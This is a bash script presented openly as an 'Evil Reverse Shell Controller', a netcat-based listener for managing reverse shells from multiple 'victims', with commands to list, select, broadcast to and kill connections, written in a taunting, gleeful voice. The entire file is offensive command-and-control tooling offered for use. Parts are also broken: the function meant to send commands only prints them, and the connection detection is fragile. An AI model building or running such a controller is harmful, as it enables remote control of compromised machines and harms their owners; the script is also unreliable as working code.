#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <port> <max_clients>"
    exit 1
fi
PORT=$1
MAX_CLIENTS=$2
declare -A victims
declare -A victim_fds
declare -A victim_pids
CURRENT_VICTIM=""
MAIN_PID=$$
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
trap 'cleanup' INT TERM EXIT
cleanup() {
    echo -e "${RED}[*] Killing all connections and exiting...${NC}"
    for pid in "${victim_pids[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    pkill -P $MAIN_PID 2>/dev/null
    exit 0
}
start_listener() {
    echo -e "${GREEN}[+] Listening on port $PORT for up to $MAX_CLIENTS victims${NC}"
    nc -lvp $PORT -c "
        echo -e \"${YELLOW}[+] New victim connected from \$NC_REMOTE_HOST${NC}\"
        echo \"\$NC_REMOTE_HOST\" >> /tmp/victim_ips_$$.tmp
        cat
    " 2>/dev/null | while read line; do
        handle_victim_output "$line"
    done &
    LISTENER_PID=$!
}
handle_victim_output() {
    local output="$1"
    if [[ "$output" =~ \[+\]New.victim.connected.from.(.+) ]]; then
        VICTIM_IP="${BASH_REMATCH[1]}"
        victims["$VICTIM_IP"]="active"
        echo -e "${GREEN}[+] Victim $VICTIM_IP added to list${NC}"
    elif [[ -n "$CURRENT_VICTIM" ]]; then
        echo -e "${YELLOW}[$CURRENT_VICTIM] ${output}${NC}"
    fi
}
control_loop() {
    echo -e "${RED}"
    echo "   ___      _ _   ____  _          _ _ "
    echo "  / _ \___ | | | / ___|| |__   ___| | |"
    echo " | | |/ _ \| | | \___ \| '_ \ / _ \ | |"
    echo " | |_| (_) | | |  ___) | | | |  __/ | |"
    echo "  \___\___/|_|_| |____/|_| |_|\___|_|_|"
    echo -e "${NC}"
    echo -e "${RED}Evil Reverse Shell Controller v1.0${NC}"
    echo -e "${RED}Type 'help' for commands, you monster${NC}"
    while true; do
        read -p "evil@hell:~$ " cmd
        case $cmd in
            list)
                echo -e "${GREEN}[+] Active victims:${NC}"
                if [ ${#victims[@]} -eq 0 ]; then
                    echo "    No victims connected... yet 😈"
                else
                    for ip in "${!victims[@]}"; do
                        echo "    $ip - ${victims[$ip]}"
                    done
                fi
                ;;
            select\ *)
                selected_ip=$(echo $cmd | cut -d' ' -f2)
                if [[ -n "${victims[$selected_ip]}" ]]; then
                    CURRENT_VICTIM=$selected_ip
                    echo -e "${GREEN}[+] Selected victim: $selected_ip${NC}"
                    echo -e "${YELLOW}[*] Type 'back' to return to main menu${NC}"
                    while true; do
                        read -p "evil@hell[$selected_ip]:~$ " victim_cmd
                        if [[ "$victim_cmd" == "back" ]]; then
                            CURRENT_VICTIM=""
                            break
                        elif [[ "$victim_cmd" == "exit" ]]; then
                            cleanup
                        else
                            # Send command to specific victim
                            send_to_victim "$selected_ip" "$victim_cmd"
                        fi
                    done
                else
                    echo -e "${RED}[!] Victim not found, you incompetent fool${NC}"
                fi
                ;;
            broadcast\ *)
                broadcast_cmd=$(echo $cmd | cut -d' ' -f2-)
                echo -e "${RED}[+] Broadcasting command to ALL victims: $broadcast_cmd${NC}"
                for ip in "${!victims[@]}"; do
                    send_to_victim "$ip" "$broadcast_cmd" &
                done
                ;;
            kill\ *)
                kill_ip=$(echo $cmd | cut -d' ' -f2)
                if [[ -n "${victims[$kill_ip]}" ]]; then
                    echo -e "${RED}[+] Terminating connection to $kill_ip${NC}"
                    unset victims["$kill_ip"]
                    pkill -f "nc.*$kill_ip" 2>/dev/null
                else
                    echo -e "${RED}[!] Victim not found, dumbass${NC}"
                fi
                ;;
            kill-all)
                echo -e "${RED}[+] Murdering ALL connections${NC}"
                victims=()
                pkill -f "nc.*$PORT" 2>/dev/null
                echo -e "${GREEN}[+] All victims terminated. How satisfying 😏${NC}"
                ;;
            help)
                echo -e "${YELLOW}Available commands:${NC}"
                echo "  list                    - Show all connected victims"
                echo "  select <ip>            - Interact with specific victim"
                echo "  broadcast <command>    - Send command to all victims"
                echo "  kill <ip>              - Kill connection to specific victim"
                echo "  kill-all               - Kill ALL connections"
                echo "  back                   - Return to main menu (when in select mode)"
                echo "  exit                   - Exit this evil tool"
                ;;
            exit)
                cleanup
                ;;
            *)
                if [[ -n "$CURRENT_VICTIM" ]]; then
                    send_to_victim "$CURRENT_VICTIM" "$cmd"
                else
                    echo -e "${RED}[!] Unknown command or no victim selected. Type 'help' you moron${NC}"
                fi
                ;;
        esac
    done
}
send_to_victim() {
    local ip=$1
    local command=$2
    echo -e "${YELLOW}[Command sent to $ip: $command]${NC}"
}
start_listener
control_loop